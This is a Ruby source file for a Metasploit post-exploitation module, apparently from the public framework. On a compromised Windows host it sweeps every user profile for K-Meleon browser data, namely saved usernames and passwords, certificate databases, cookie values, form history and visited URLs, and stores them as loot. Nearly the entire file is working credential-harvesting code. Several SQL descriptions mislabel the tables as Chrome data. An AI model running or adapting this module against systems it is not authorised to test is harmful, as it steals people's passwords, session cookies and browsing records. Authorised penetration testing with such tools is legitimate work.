##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  ARTIFACTS =
    {
      application: 'k-meleon',
      app_category: 'browsers',
      gatherable_artifacts: [
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'K-Meleon',
          artifact_file_name: 'signons.sqlite',
          description: "K-Meleon's saved Username and Passwords",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'logins',
              sql_column: 'username_value, action_url'
            }
          ]
        },
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'K-Meleon',
          artifact_file_name: 'cert8.db',
          description: "K-Melon's saved Username and Passwords",
          credential_type: 'database'
        },
        {
          filetypes: 'cookies',
          path: 'AppData',
          dir: 'K-Meleon',
          artifact_file_name: 'cookies.sqlite',
          description: "K-Meleon's Cookies",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'moz_cookies',
              sql_column: 'baseDomain, host, name, path, value'
            }
          ]
        },
        {
          filetypes: 'web_history',
          path: 'AppData',
          dir: 'K-Meleon',
          artifact_file_name: 'formhistory.sqlite',
          description: "K-Meleon's Visited websites ",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'moz_formhistory',
              sql_column: 'value'
            }
          ]
        },
        {
          filetypes: 'web_history',
          path: 'AppData',
          dir: 'K-Meleon',
          artifact_file_name: 'places.sqlite',
          description: "K-Meleon's Visited websites ",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'moz_places',
              sql_column: 'url'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'moz_inputhistory',
              sql_column: 'input'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'moz_hosts',
              sql_column: 'host'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'moz_keywords',
              sql_column: 'keyword'
            }
          ]
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kmeleon credential gatherer',
        'Description' => %q{
          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
          Further details can be found in the module documentation.
          This is a module that searches for K-meleon credentials on a windows remote host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep Completed'
  end
end
